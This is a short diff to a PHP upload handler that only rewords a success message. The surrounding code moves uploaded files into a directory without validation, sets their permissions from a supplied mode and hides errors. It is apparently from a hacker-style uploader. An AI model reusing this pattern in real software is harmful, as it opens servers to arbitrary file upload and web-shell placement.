@@ -19,7 +19,7 @@ if(isset($_POST['Submit'])){
         $qx = $filedir.$userfile_name;
         @move_uploaded_file($userfile_tmp, $qx);
         @chmod ($qx, octdec($mode));
-echo" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>";
+echo" <a href=$userfile_name><center><b>Uploaded Success ==> $userfile_name</b></center></a>";
 }
 }
 else{
